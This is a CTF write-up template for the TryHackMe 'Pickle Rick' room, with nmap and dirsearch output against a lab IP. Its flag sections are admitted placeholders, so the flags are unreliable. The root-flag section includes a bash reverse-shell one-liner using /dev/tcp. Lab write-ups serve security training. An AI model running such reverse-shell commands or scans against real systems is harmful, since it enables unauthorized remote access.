---
title: "tryhackme - picklerick"
author: 0r10nh@ck
date: "2021-06-15"
subject: "CTF Writeup Template"
keywords: [CTF, tryhackme, Security]
lang: "en"
titlepage: true
title-page-color: "141d2b"
titlepage-rule-color: "11b925"
titlepage-text-color: "FFFFFF"
toc: true
toc-own-page: true

...

<= [HOME](./../../index.md)

# Pickle Rick

![pick](https://tryhackme-images.s3.amazonaws.com/room-icons/47d2d3ade1795f81a155d0aca6e4da96.jpeg)

A Rick and Morty CTF. Help turn Rick back into a human!

> https://tryhackme.com/room/picklerick

# Information Gathering

My first step was to check the application's source code.
Found the following comment:

```html
<!--

     Note to self, remember username!

     Username: R1ckRul3s

   -->
```

### Nmap

We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```console
$ nmap -v 10.10.133.253             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 13:09 -03
Initiating Ping Scan at 13:09
Scanning 10.10.133.253 [2 ports]
Completed Ping Scan at 13:09, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:09
Completed Parallel DNS resolution of 1 host. at 13:09, 0.16s elapsed
Initiating Connect Scan at 13:09
Scanning 10.10.133.253 [1000 ports]
Discovered open port 22/tcp on 10.10.133.253
Discovered open port 80/tcp on 10.10.133.253
Increasing send delay for 10.10.133.253 from 0 to 5 due to 31 out of 101 dropped probes since last increase.
Increasing send delay for 10.10.133.253 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.133.253 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.133.253 from 20 to 40 due to max_successful_tryno increase to 6
Completed Connect Scan at 13:10, 54.30s elapsed (1000 total ports)
Nmap scan report for 10.10.133.253
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 55.00 seconds

```

Scanning the specifics ports:

```console
$ nmap -v -sV -p 22,80 10.10.133.253
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 13:11 -03
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 13:11
Scanning 10.10.133.253 [2 ports]
Completed Ping Scan at 13:11, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:11
Completed Parallel DNS resolution of 1 host. at 13:11, 0.11s elapsed
Initiating Connect Scan at 13:11
Scanning 10.10.133.253 [2 ports]
Discovered open port 22/tcp on 10.10.133.253
Discovered open port 80/tcp on 10.10.133.253
Completed Connect Scan at 13:11, 0.25s elapsed (2 total ports)
Initiating Service scan at 13:11
Scanning 2 services on 10.10.133.253
Completed Service scan at 13:11, 6.58s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.133.253.
Initiating NSE at 13:11
Completed NSE at 13:11, 1.23s elapsed
Initiating NSE at 13:11
Completed NSE at 13:11, 1.01s elapsed
Nmap scan report for 10.10.133.253
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.23 seconds
```
From the above output we can see that ports, **22**, and **80** are the ports open. This is just an example to show code formatting so who cares.

### Content Discovery

Using dirsearch:

```console
$ dirsearch -u http://10.10.133.253 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10991

Output File: /usr/share/sniper/plugins/dirsearch/reports/10.10.133.253/_22-06-11_13-30-52.txt

Error Log: /usr/share/sniper/plugins/dirsearch/logs/errors-22-06-11_13-30-52.log

Target: http://10.10.133.253/

[13:30:52] Starting: 
[13:30:56] 400 -  305B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[13:31:05] 403 -  299B  - /.ht_wsr.txt
[13:31:05] 403 -  303B  - /.htaccess_extra
[13:31:05] 403 -  301B  - /.htaccessOLD2
[13:31:05] 403 -  300B  - /.htaccessBAK
[13:31:05] 403 -  300B  - /.htaccessOLD
[13:31:05] 403 -  300B  - /.htaccess_sc
[13:31:05] 403 -  302B  - /.htaccess_orig
[13:31:05] 403 -  292B  - /.htm
[13:31:05] 403 -  293B  - /.html
[13:31:05] 403 -  302B  - /.htaccess.orig
[13:31:05] 403 -  304B  - /.htaccess.sample
[13:31:05] 403 -  302B  - /.htaccess.save
[13:31:05] 403 -  302B  - /.htaccess.bak1
[13:31:05] 403 -  299B  - /.httr-oauth
[13:31:05] 403 -  298B  - /.htpasswds
[13:31:05] 403 -  302B  - /.htpasswd_test
[13:31:10] 403 -  292B  - /.php
[13:31:10] 403 -  293B  - /.php3
[13:32:09] 200 -    2KB - /assets/
[13:32:09] 301 -  315B  - /assets  ->  http://10.10.133.253/assets/
[13:32:18] 400 -  305B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[13:32:49] 200 -    1KB - /index.html
[13:32:58] 200 -  882B  - /login.php
[13:33:30] 200 -   17B  - /robots.txt
[13:33:33] 403 -  302B  - /server-status/
[13:33:33] 403 -  301B  - /server-status

Task Completed

```
---

## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.

# References
1. [https://ryankozak.com/how-i-do-my-ctf-writeups/](https://ryankozak.com/how-i-do-my-ctf-writeups/)
2. [https://github.com/Wandmalfarbe/pandoc-latex-template](https://github.com/Wandmalfarbe/pandoc-latex-template)
3. [https://hackthebox.eu](https://hackthebox.eu)
4. [https://forum.hackthebox.eu](https://forum.hackthebox.eu)